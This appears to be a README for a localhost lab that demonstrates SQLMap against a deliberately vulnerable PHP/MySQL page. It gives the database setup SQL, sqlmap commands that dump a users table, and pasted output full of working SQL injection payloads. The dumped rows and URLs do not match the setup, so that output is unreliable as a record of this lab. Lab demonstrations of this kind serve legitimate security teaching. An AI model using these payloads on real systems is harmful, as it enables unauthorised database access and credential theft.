# SqlMapDemo
Demonstration of SQLMap on a vulnerable webpage made from PHP &amp; MySQL.

PHPADMIN SQL Query:
CREATE DATABASE demo;
USE demo;

CREATE TABLE users (id INT AUTO_INCREMENT PRIMARY KEY, username VARCHAR(64) NOT NULL UNIQUE, password VARCHAR(255) NOT NULL, email VARCHAR(255) NOT NULL);

INSERT INTO users (username, password, email) VALUES
('test', 'password123', 'test@gmail.com'),
('alice',   'password',     'alice@hotmail.com'),
('mark', 'qwerty',      'mark@yahoo.com'),
('smith', 'letmein',      'smith@gmail.com'),
('john', '123456',      'john@outlook.com'),
('jane', '111111',      'jane@yahoo.com'),
('bob', 'abc123',      'bob@hotmail.com'),
('student', 'iloveyou',      'student@gmail.com'),
('admin', 'admin123',      'admin@gmail.com'),
('guest', 'welcome',      'guest@yahoo.com');

DROP USER IF EXISTS 'demouser'@'localhost';
CREATE USER 'demouser'@'localhost' IDENTIFIED BY 'demopass';
GRANT SELECT, INSERT, UPDATE ON demo.* TO 'demouser'@'localhost';
FLUSH PRIVILEGES;

Final SQL Commands:
sqlmap -u "http://localhost/sqlmapdemo/index.php" --data="function=vulnerable_search&search=test" --batch

sqlmap -u "http://localhost/sqlmapdemo/index.php" --data="function=vulnerable_search&search=test" --dbs --batch

sqlmap -u "http://localhost/sqlmapdemo/index.php" --data="function=vulnerable_search&search=test" -D demo --tables --batch

sqlmap -u "http://localhost/sqlmapdemo/index.php" --data="function=vulnerable_search&search=test" -D demo -T users --dump --batch

sqlmap -u "http://localhost/sqlmapdemo/index.php" --data="function=login&username=test&password=password123" --batch

sqlmap -u "http://localhost/sqlmapdemo/index.php" --data="function=login&username=admin&password=admin123" -p username --dbs --batch

sqlmap -u "http://localhost/sqlmapdemo/index.php" --data="function=login&username=admin&password=admin123" -p username -D demo -T users --dump --batch


      SQLMAP COMMANDS AND OUTPUT:
      sqlmap -u "http://localhost/sqlmapdemo/vulnerable.php?term=test" -p term --dbms=mysql --batch --risk=3 --level=5
      GET parameter 'term' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
      sqlmap identified the following injection point(s) with a total of 240 HTTP(s) requests:
      ---
      Parameter: term (GET)
          Type: boolean-based blind
          Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
          Payload: term=test' OR NOT 7388=7388-- QTHD
      
          Type: error-based
          Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
          Payload: term=test' AND (SELECT 4939 FROM(SELECT COUNT(*),CONCAT(0x7171627171,(SELECT (ELT(4939=4939,1))),0x7162707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- UkbI
      
          Type: time-based blind
          Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
          Payload: term=test' AND (SELECT 4242 FROM (SELECT(SLEEP(5)))phvE)-- iSiv
      
          Type: UNION query
          Title: Generic UNION query (NULL) - 3 columns
          Payload: term=test' UNION ALL SELECT NULL,CONCAT(0x7171627171,0x70416f494e5554535062436a765a7941774b4f617273476a70446163774162737754436148496d76,0x7162707671),NULL-- -     
      ---
      
      
      sqlmap -u "http://localhost/sqlmapdemo/vulnerable.php?term=test" -p term -D demo -T users --dump
      ---
      Parameter: term (GET)
          Type: boolean-based blind
          Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
          Payload: term=test' OR NOT 7388=7388-- QTHD
      
          Type: error-based
          Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
          Payload: term=test' AND (SELECT 4939 FROM(SELECT COUNT(*),CONCAT(0x7171627171,(SELECT (ELT(4939=4939,1))),0x7162707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- UkbI
      
          Type: time-based blind
          Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
          Payload: term=test' AND (SELECT 4242 FROM (SELECT(SLEEP(5)))phvE)-- iSiv
      
          Type: UNION query
          Title: Generic UNION query (NULL) - 3 columns
          Payload: term=test' UNION ALL SELECT NULL,CONCAT(0x7171627171,0x70416f494e5554535062436a765a7941774b4f617273476a70446163774162737754436148496d76,0x7162707671),NULL-- -     
      ---
      Database: demo
      Table: users
      [3 entries]
      +----+-------------------+-------------+----------+
      | id | email             | password    | username |
      +----+-------------------+-------------+----------+
      | 1  | alice@example.com | password123 | alice    |
      | 2  | bob@example.com   | hunter2     | bob      |
      | 3  | chloe@example.com | qwerty      | chloe    |
      +----+-------------------+-------------+----------+
      
      
      sqlmap -u "http://localhost/sqlmapdemo/login.php" \  --data="username=alice&password=test" \  -p username --batch --dbms=mysql
      ---
      Parameter: username (POST)
          Type: boolean-based blind
          Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
          Payload: username=alice%' OR NOT 5696=5696#&password=test
      
          Type: error-based
          Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
          Payload: username=alice%' AND EXTRACTVALUE(8184,CONCAT(0x5c,0x716a6a7071,(SELECT (ELT(8184=8184,1))),0x716a766271)) AND 'xgEN%'='xgEN&password=test
      
          Type: time-based blind
          Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
          Payload: username=alice%' AND (SELECT 3114 FROM (SELECT(SLEEP(5)))lUEX) AND 'yLLg%'='yLLg&password=test
      
          Type: UNION query
          Title: MySQL UNION query (NULL) - 2 columns
          Payload: username=alice%' UNION ALL SELECT NULL,CONCAT(0x716a6a7071,0x736a566275747373677a556c74526c534665765a67505564785855454b6c5951686c484f73796648,0x716a766271)#&password=test
      ---
